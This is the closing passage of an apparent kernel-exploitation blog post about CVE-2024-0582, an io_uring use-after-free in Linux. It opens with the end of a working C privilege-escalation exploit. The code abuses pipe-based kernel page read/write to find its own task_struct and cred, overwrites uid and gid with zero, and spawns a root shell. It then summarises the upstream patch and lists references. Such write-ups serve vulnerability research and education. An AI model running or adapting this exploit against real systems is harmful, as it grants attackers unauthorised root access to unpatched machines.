&#125;</span><br><span class="line">        <span class="built_in">printf</span>(</span><br><span class="line">            <span class="string">&quot;[No.%ld loop] Got unmatched data: %lx, keep looping...&quot;</span>,</span><br><span class="line">            loop_nr,</span><br><span class="line">            kernel_leak</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        vmemmap_base -= KASLR_GRANULARITY;</span><br><span class="line">        read_kernel_page_by_pipe(</span><br><span class="line">            (<span class="type">void</span>*) (vmemmap_base + <span class="number">0x9d000</span> / <span class="number">0x1000</span> * <span class="number">0x40</span>),</span><br><span class="line">            kern_pipe_buffer,</span><br><span class="line">            pipe_fd[victim_idx],</span><br><span class="line">            &amp;kernel_leak,</span><br><span class="line">            <span class="keyword">sizeof</span>(kernel_leak)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Finding task_struct of current process in kernel space ...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;rat3bant&quot;</span>);</span><br><span class="line">    uid = getuid();</span><br><span class="line">    gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> *comm_addr;</span><br><span class="line"></span><br><span class="line">        read_kernel_page_by_pipe(</span><br><span class="line">            (<span class="type">void</span>*) (vmemmap_base + <span class="number">0x40</span> * i),</span><br><span class="line">            kern_pipe_buffer,</span><br><span class="line">            pipe_fd[victim_idx],</span><br><span class="line">            buf,</span><br><span class="line">            <span class="number">0xff8</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        comm_addr = memmem(buf, <span class="number">0xff0</span>, <span class="string">&quot;rat3bant&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-2</span>] == comm_addr[<span class="number">-3</span>])) &#123;  <span class="comment">/* should be equal */</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                SUCCESS_MSG(<span class="string">&quot;[+] Found task_struct on page: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,</span><br><span class="line">                (vmemmap_base + i * <span class="number">0x40</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got cred address: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,comm_addr[<span class="number">-2</span>]);</span><br><span class="line"></span><br><span class="line">            cred_kaddr = comm_addr[<span class="number">-2</span>];</span><br><span class="line">            cred_data = (<span class="type">void</span>*) (buf + (cred_kaddr &amp; (PAGE_SIZE - <span class="number">1</span>)));</span><br><span class="line">            page_offset_base = cred_kaddr &amp; KASLR_MASK;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                cred_kpage_addr = vmemmap_base + \</span><br><span class="line">                                (cred_kaddr - page_offset_base) / <span class="number">0x1000</span> * <span class="number">0x40</span>;</span><br><span class="line">            </span><br><span class="line">                read_kernel_page_by_pipe(</span><br><span class="line">                    (<span class="type">void</span>*) cred_kpage_addr,</span><br><span class="line">                    kern_pipe_buffer,</span><br><span class="line">                    pipe_fd[victim_idx],</span><br><span class="line">                    buf,</span><br><span class="line">                    <span class="number">0xffe</span></span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">if</span> (cred_data-&gt;uid == uid</span><br><span class="line">                    &amp;&amp; cred_data-&gt;gid == gid) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(</span><br><span class="line">                        SUCCESS_MSG(<span class="string">&quot;[+] Found cred on page: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,</span><br><span class="line">                        cred_kpage_addr</span><br><span class="line">                    );</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                page_offset_base -= KASLR_GRANULARITY;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Overwriting cred and granting root privilege...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cred_data-&gt;uid = <span class="number">0</span>;</span><br><span class="line">    cred_data-&gt;gid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write_kernel_page_by_pipe(</span><br><span class="line">        (<span class="type">void</span>*) cred_kpage_addr,</span><br><span class="line">        kern_pipe_buffer,</span><br><span class="line">        pipe_fd[victim_idx],</span><br><span class="line">        buf,</span><br><span class="line">        <span class="number">0xff0</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    exploit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x03-Patch"><a href="#0x03-Patch" class="headerlink" title="0x03. Patch"></a>0x03. Patch</h1><p>This vulnerability got fixed with the commit <a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c392cbecd8eca4c53f2bf508731257d9d0a21c2d">c392cbecd8eca4c53f2bf508731257d9d0a21c2d</a>, which has done the following patches:</p>
<ul>
<li>Add a linked list to record corresponding data for the delay release.</li>
<li>Delay the release of the ring buffer to the time of closing the <code>io_uring</code> (i.e., calling the <code>file_operations::release()</code> in kernel), hence the memory will be reclaimed only after the <code>mmap()</code> region was destroyed.</li>
</ul>
<h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2024-0582">cve.org - CVE-2024-0582</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/arttnba3/Linux-kernel-exploitation">GitHub - arttnba3&#x2F;Linux-kernel-exploitation</a></li>
<li><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c392cbecd8eca4c53f2bf508731257d9d0a21c2d">Kernel.org git repositories - io_uring&#x2F;kbuf: defer release of mapped buffer rings</a></li>
</ul>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>arttnba3</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://blog.arttnba3.cn/2025/02/22/CVE-0X0C-CVE-2024-0582/">http://blog.arttnba3.cn/2025/02/22/CVE-0X0C-CVE-2024-0582/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2025 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Pwn/"># Pwn</a>
                    
                        <a href="/tags/Linux/"># Linux</a>
                    
                        <a href="/tags/Linux-Kernel/"># Linux Kernel</a>
                    
                        <a href="/tags/CVE/"># CVE</a>
                    
                        <a href="/tags/Privilege-Escalation/"># Privilege Escalation</a>
                    
                        <a href="/tags/IO-URING/"># IO_URING</a>
                    
                        <a href="/tags/Use-After-Free/"># Use After Free</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/06/04/CTF-0X0A_D3CTF2025_D3KSHRM_D3KHEAP2/">[CTF.0x0A] D^3CTF2025 Official Writeup - d3kheap2 & d3kshrm</a>
            
            
            <a class="next" rel="next" href="/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">[CTF.0x08] D^3CTF2023 d3kcache: From null-byte cross-cache overflow to infinite arbitrary read & write.</a>
            
        </section>


    </article>
</div>

            </div>
            

<footer id="footer" class="footer">
    <div class="copyright">
        <span>
            © 2019 - 2025 arttnba3 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a>
        </span>
    </div>
</footer>

    </div>
</body>

</html>